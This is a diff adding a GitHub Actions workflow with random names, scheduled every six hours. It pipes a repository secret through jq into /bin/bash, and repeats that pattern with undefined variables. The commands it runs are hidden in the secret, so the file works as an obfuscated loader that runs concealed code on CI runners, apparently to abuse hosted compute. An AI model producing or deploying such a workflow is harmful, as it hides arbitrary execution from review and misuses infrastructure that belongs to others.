@@ -1,0 +1,25 @@
+name: fuzhengliu7618
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fuzhengliu7618
+        env:
+          vydpm26: ${{ secrets.vydpm26 }}
+        run: |
+          echo $vydpm26 | jq -r .qmk5 | /bin/bash
+          echo $vd6 | jq -r .rwqg785 | /bin/bash
+          echo $leobf4 | jq -r .k30 | /bin/bash
+          echo $vvew95 | jq -r .hfjx9717 | /bin/bash
+          echo $byek5335 | jq -r .gr84900 | /bin/bash
+          echo $v719 | jq -r .ogc7 | /bin/bash
+          echo $ohe47913 | jq -r .uxrhv0238 | /bin/bash
+          echo $zr514 | jq -r .kmhon82 | /bin/bash
+
